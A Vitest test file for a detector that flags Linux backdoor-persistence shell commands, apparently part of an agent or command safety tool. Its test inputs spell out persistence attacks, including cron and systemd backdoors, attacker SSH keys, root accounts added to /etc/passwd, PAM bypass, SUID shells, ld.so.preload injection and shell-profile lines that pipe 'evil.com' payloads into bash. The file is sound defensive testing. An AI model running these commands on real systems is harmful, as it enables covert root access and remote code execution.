import { describe, it, expect } from 'vitest';
import { detectBackdoorPersistence } from '../backdoor-persistence';

describe('detectBackdoorPersistence', () => {
  describe('cron job manipulation', () => {
    it('should detect crontab -e', async () => {
      const result = await detectBackdoorPersistence({ command: 'crontab -e' });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
      expect(result?.detector).toBe('backdoor-persistence');
      expect(result?.message).toContain('Cron job');
    });

    it('should detect crontab with file argument', async () => {
      const result = await detectBackdoorPersistence({ command: 'crontab /tmp/malicious-cron' });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect echo to /etc/cron.d/', async () => {
      const result = await detectBackdoorPersistence({
        command: 'echo "* * * * * root /tmp/backdoor.sh" >> /etc/cron.d/malicious',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect writing to /var/spool/cron/', async () => {
      const result = await detectBackdoorPersistence({
        command: 'echo "* * * * * /tmp/evil.sh" > /var/spool/cron/root',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect writing to cron.daily', async () => {
      const result = await detectBackdoorPersistence({
        command: 'cat backdoor.sh > /etc/cron.daily/update',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should allow reading crontab', async () => {
      const result = await detectBackdoorPersistence({ command: 'crontab -l' });
      expect(result).toBeNull();
    });

    it('should allow reading crontab for user', async () => {
      const result = await detectBackdoorPersistence({ command: 'crontab -l -u www-data' });
      expect(result).toBeNull();
    });
  });

  describe('systemd service manipulation', () => {
    it('should detect systemctl enable', async () => {
      const result = await detectBackdoorPersistence({
        command: 'systemctl enable malicious.service',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
      expect(result?.message).toContain('Systemd');
    });

    it('should detect daemon-reload and enable', async () => {
      const result = await detectBackdoorPersistence({
        command: 'systemctl daemon-reload && systemctl enable backdoor.service',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect writing to /etc/systemd/system/', async () => {
      const result = await detectBackdoorPersistence({
        command: 'echo "[Service]" > /etc/systemd/system/evil.service',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect cat to systemd directory', async () => {
      const result = await detectBackdoorPersistence({
        command: 'cat backdoor.service > /lib/systemd/system/backdoor.service',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should allow systemctl status', async () => {
      const result = await detectBackdoorPersistence({ command: 'systemctl status nginx' });
      expect(result).toBeNull();
    });

    it('should allow systemctl show', async () => {
      const result = await detectBackdoorPersistence({ command: 'systemctl show docker' });
      expect(result).toBeNull();
    });

    it('should allow systemctl is-enabled', async () => {
      const result = await detectBackdoorPersistence({
        command: 'systemctl is-enabled ssh.service',
      });
      expect(result).toBeNull();
    });
  });

  describe('SSH key manipulation', () => {
    it('should detect echo to authorized_keys', async () => {
      const result = await detectBackdoorPersistence({
        command: 'echo "ssh-rsa AAAAB3NzaC1yc2E... attacker@evil.com" >> ~/.ssh/authorized_keys',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
      expect(result?.message).toContain('SSH key');
    });

    it('should detect cat to authorized_keys', async () => {
      const result = await detectBackdoorPersistence({
        command: 'cat attacker_key.pub >> /home/user/.ssh/authorized_keys',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect tee to authorized_keys', async () => {
      const result = await detectBackdoorPersistence({
        command: 'echo "ssh-rsa ..." | tee -a ~/.ssh/authorized_keys',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect ssh-copy-id', async () => {
      const result = await detectBackdoorPersistence({
        command: 'ssh-copy-id -i ~/.ssh/attacker_key.pub user@target',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect writing to .ssh directory', async () => {
      const result = await detectBackdoorPersistence({
        command: 'echo "malicious config" > ~/.ssh/config',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should allow reading authorized_keys', async () => {
      const result = await detectBackdoorPersistence({
        command: 'cat ~/.ssh/authorized_keys',
      });
      expect(result).toBeNull();
    });

    it('should allow less on authorized_keys', async () => {
      const result = await detectBackdoorPersistence({
        command: 'less ~/.ssh/authorized_keys',
      });
      expect(result).toBeNull();
    });
  });

  describe('shell profile manipulation', () => {
    it('should detect echo to .bashrc', async () => {
      const result = await detectBackdoorPersistence({
        command: 'echo "curl http://evil.com/backdoor.sh | bash" >> ~/.bashrc',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
      expect(result?.message).toContain('Shell profile');
    });

    it('should detect echo to .bash_profile', async () => {
      const result = await detectBackdoorPersistence({
        command: 'echo "export PATH=/tmp:$PATH" >> ~/.bash_profile',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect echo to .zshrc', async () => {
      const result = await detectBackdoorPersistence({
        command: 'echo "source /tmp/malicious.sh" >> ~/.zshrc',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect echo to .profile', async () => {
      const result = await detectBackdoorPersistence({
        command: 'echo "eval $(curl http://evil.com/payload)" >> ~/.profile',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect tee to .bashrc', async () => {
      const result = await detectBackdoorPersistence({
        command: 'echo "malicious code" | tee -a ~/.bashrc',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect echo to /etc/profile', async () => {
      const result = await detectBackdoorPersistence({
        command: 'echo "source /tmp/backdoor" >> /etc/profile',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should allow reading .bashrc', async () => {
      const result = await detectBackdoorPersistence({ command: 'cat ~/.bashrc' });
      expect(result).toBeNull();
    });

    it('should allow reading .zshrc', async () => {
      const result = await detectBackdoorPersistence({ command: 'less ~/.zshrc' });
      expect(result).toBeNull();
    });
  });

  describe('startup script manipulation', () => {
    it('should detect echo to /etc/rc.local', async () => {
      const result = await detectBackdoorPersistence({
        command: 'echo "/tmp/backdoor.sh &" >> /etc/rc.local',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
      expect(result?.message).toContain('Startup script');
    });

    it('should detect writing to /etc/init.d/', async () => {
      const result = await detectBackdoorPersistence({
        command: 'echo "#!/bin/bash" > /etc/init.d/malicious',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect writing to autostart directory', async () => {
      const result = await detectBackdoorPersistence({
        command: 'cat backdoor.desktop > ~/.config/autostart/backdoor.desktop',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect writing to XDG autostart', async () => {
      const result = await detectBackdoorPersistence({
        command: 'echo "[Desktop Entry]" > /etc/xdg/autostart/evil.desktop',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect overwriting rc.local', async () => {
      const result = await detectBackdoorPersistence({
        command: 'cat malicious_script > /etc/rc.local',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });
  });

  describe('SUID binary manipulation', () => {
    it('should detect chmod u+s', async () => {
      const result = await detectBackdoorPersistence({
        command: 'chmod u+s /tmp/backdoor',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
      expect(result?.message).toContain('SUID');
    });

    it('should detect chmod 4755', async () => {
      const result = await detectBackdoorPersistence({
        command: 'chmod 4755 /usr/local/bin/backdoor',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect chmod +s on shell', async () => {
      const result = await detectBackdoorPersistence({ command: 'chmod +s /bin/bash' });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect SUID on system binary', async () => {
      const result = await detectBackdoorPersistence({
        command: 'chmod u+s /usr/bin/malicious',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect numeric SUID (6755)', async () => {
      const result = await detectBackdoorPersistence({
        command: 'chmod 6755 /tmp/evil',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });
  });

  describe('LD_PRELOAD manipulation', () => {
    it('should detect export LD_PRELOAD', async () => {
      const result = await detectBackdoorPersistence({
        command: 'export LD_PRELOAD=/tmp/malicious.so',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
      expect(result?.message).toContain('LD_PRELOAD');
    });

    it('should detect LD_PRELOAD assignment', async () => {
      const result = await detectBackdoorPersistence({
        command: 'LD_PRELOAD=/tmp/evil.so ./target_program',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect writing to /etc/ld.so.preload', async () => {
      const result = await detectBackdoorPersistence({
        command: 'echo "/tmp/malicious.so" >> /etc/ld.so.preload',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect cat to ld.so.preload', async () => {
      const result = await detectBackdoorPersistence({
        command: 'cat malicious.conf > /etc/ld.so.preload',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect export LD_LIBRARY_PATH', async () => {
      const result = await detectBackdoorPersistence({
        command: 'export LD_LIBRARY_PATH=/tmp/malicious_libs:$LD_LIBRARY_PATH',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });
  });

  describe('login manipulation', () => {
    it('should detect echo to /etc/passwd', async () => {
      const result = await detectBackdoorPersistence({
        command: 'echo "attacker::0:0:root:/root:/bin/bash" >> /etc/passwd',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
      expect(result?.message).toContain('Login system');
    });

    it('should detect cat to /etc/passwd', async () => {
      const result = await detectBackdoorPersistence({
        command: 'cat malicious_passwd >> /etc/passwd',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect sed on /etc/passwd', async () => {
      const result = await detectBackdoorPersistence({
        command: "sed -i 's/user:x:/user::/g' /etc/passwd",
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect echo to /etc/shadow', async () => {
      const result = await detectBackdoorPersistence({
        command: 'echo "attacker:$6$salt$hash::::::::" >> /etc/shadow',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect writing to PAM config', async () => {
      const result = await detectBackdoorPersistence({
        command: 'echo "auth sufficient pam_permit.so" > /etc/pam.d/sshd',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect tee to /etc/passwd', async () => {
      const result = await detectBackdoorPersistence({
        command: 'echo "backdoor:x:0:0::/tmp:/bin/sh" | tee -a /etc/passwd',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });
  });

  describe('browser extension installation', () => {
    it('should detect writing to Chrome extensions directory', async () => {
      const result = await detectBackdoorPersistence({
        command: 'cp -r malicious_extension ~/.config/google-chrome/Default/Extensions/abcdef',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
      expect(result?.message).toContain('Browser extension');
    });

    it('should detect chrome --load-extension', async () => {
      const result = await detectBackdoorPersistence({
        command: 'google-chrome --load-extension=/tmp/malicious_extension',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect writing to Firefox extensions', async () => {
      const result = await detectBackdoorPersistence({
        command: 'cp backdoor.xpi ~/.mozilla/firefox/profile/extensions/',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect chromium --load-extension', async () => {
      const result = await detectBackdoorPersistence({
        command: 'chromium --load-extension=/tmp/evil_extension',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });
  });

  describe('at and batch job scheduling', () => {
    it('should detect at with time argument', async () => {
      const result = await detectBackdoorPersistence({
        command: 'echo "/tmp/backdoor.sh" | at now + 1 hour',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
      expect(result?.message).toContain('Scheduled job');
    });

    it('should detect at with tomorrow', async () => {
      const result = await detectBackdoorPersistence({
        command: 'at tomorrow <<EOF\n/tmp/evil.sh\nEOF',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect at -f', async () => {
      const result = await detectBackdoorPersistence({
        command: 'at -f /tmp/malicious_script.sh now + 10 minutes',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect batch command', async () => {
      const result = await detectBackdoorPersistence({
        command: 'echo "/tmp/backdoor" | batch',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect batch -f', async () => {
      const result = await detectBackdoorPersistence({
        command: 'batch -f /tmp/evil.sh',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should allow listing at jobs', async () => {
      const result = await detectBackdoorPersistence({ command: 'atq' });
      expect(result).toBeNull();
    });

    it('should allow at -l', async () => {
      const result = await detectBackdoorPersistence({ command: 'at -l' });
      expect(result).toBeNull();
    });
  });

  describe('complex scenarios', () => {
    it('should detect multi-command persistence', async () => {
      const result = await detectBackdoorPersistence({
        command:
          'echo "* * * * * /tmp/backdoor.sh" >> /etc/cron.d/update && chmod +x /tmp/backdoor.sh',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect chained systemd setup', async () => {
      const result = await detectBackdoorPersistence({
        command:
          'cat backdoor.service > /etc/systemd/system/backdoor.service && systemctl daemon-reload && systemctl enable backdoor.service',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });

    it('should detect SSH key with profile modification', async () => {
      const result = await detectBackdoorPersistence({
        command:
          'echo "ssh-rsa AAAAB..." >> ~/.ssh/authorized_keys && echo "cd /tmp && ./backdoor" >> ~/.bashrc',
      });
      expect(result).not.toBeNull();
      expect(result?.severity).toBe('high');
    });
  });

  describe('safe operations', () => {
    it('should allow normal file operations', async () => {
      const testCases = [
        'cat myfile.txt',
        'echo "hello world"',
        'chmod +x script.sh',
        'systemctl status nginx',
        'crontab -l',
        'less ~/.bashrc',
      ];

      for (const command of testCases) {
        const result = await detectBackdoorPersistence({ command });
        expect(result).toBeNull();
      }
    });
  });
});
